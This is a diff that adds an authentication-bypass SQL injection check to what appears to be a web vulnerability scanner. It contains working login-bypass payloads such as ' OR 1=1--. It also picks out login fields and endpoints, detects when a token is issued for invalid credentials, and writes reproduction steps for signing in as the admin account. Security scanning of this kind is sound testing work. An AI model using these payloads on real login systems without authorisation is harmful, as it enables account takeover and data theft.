@@ -158,6 +158,57 @@ def boolean_finding(url: str, param: str, pair: dict) -> dict:
                   "Extract data one boolean at a time (substring/ASCII)"])
 
 
+# ── auth-bypass SQLi (POST/JSON body — e.g. a login email field) ─────────────
+# Payloads that neutralise the WHERE clause of a login query so the first row is
+# returned without valid credentials. High-value: this is the canonical API/login
+# SQLi that query-string probes never reach.
+AUTH_BYPASS_PAYLOADS = ["' OR 1=1--", "' OR '1'='1'--", "' OR 1=1#", "admin'--",
+                        "') OR ('1'='1'--", "\" OR 1=1--"]
+
+# request-body field names worth injecting for an auth bypass
+LOGIN_FIELD_HINTS = ("email", "username", "user", "login", "userid", "user_name", "account")
+
+_LOGIN_PATH = re.compile(r"(login|signin|sign-in|authenticate|authentication|session|token|auth)\b", re.I)
+
+
+def looks_like_login(path_or_url: str) -> bool:
+    """True when a path/URL looks like a credential-checking endpoint worth an
+    auth-bypass body probe (deterministic, no network)."""
+    return bool(_LOGIN_PATH.search(path_or_url or ""))
+
+
+def auth_bypass_confirmed(base_status: int, base_body: str,
+                          inj_status: int, inj_body: str) -> dict:
+    """Decide whether a login body-injection actually bypassed auth, comparing the
+    injected response to a benign baseline. Returns {} when not confirmed.
+    Signals (any, only when the baseline did NOT already have them): a session/JWT
+    token or an authentication object appears, or a rejected 401/403 flips to 200."""
+    b, i = (base_body or ""), (inj_body or "")
+    tok = re.compile(r'"(authentication|token|access_token|authorization)"\s*:|'
+                     r'\beyJ[A-Za-z0-9_-]{10,}\.', re.I)
+    base_has = bool(tok.search(b))
+    inj_has = bool(tok.search(i))
+    if inj_has and not base_has:
+        return {"signal": "session/JWT token issued for an invalid credential", "how": "token"}
+    if base_status in (401, 403, 400) and inj_status == 200 and len(i) > len(b):
+        return {"signal": f"login rejected ({base_status}) but the injection returned 200", "how": "status"}
+    return {}
+
+
+def auth_bypass_finding(url: str, field: str, payload: str, signal: str) -> dict:
+    f = _base(url, field, "auth-bypass", "critical",
+              (f"A SQL-injection payload in the '{field}' body field of a login request "
+               f"bypassed authentication: {signal}. The field is concatenated into the "
+               "authentication query, so its WHERE clause can be neutralised."),
+              f"{signal} via {field}={payload!r}",
+              [f"POST the login request with '{field}' set to {payload!r}",
+               "Observe authentication succeed without valid credentials (token issued / 200)",
+               "Log in as the first/admin account, or enumerate users via UNION"])
+    f["impact"] = ("Full authentication bypass: sign in as any user (typically the first/admin row) "
+                   "without credentials, then read or modify that account's data.")
+    return f
+
+
 def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
     return _base(url, param, "time-blind", "critical",
                  (f"For '{param}', a {item['dbms']} sleep payload delayed the response to {sleep_elapsed:.1f}s vs "
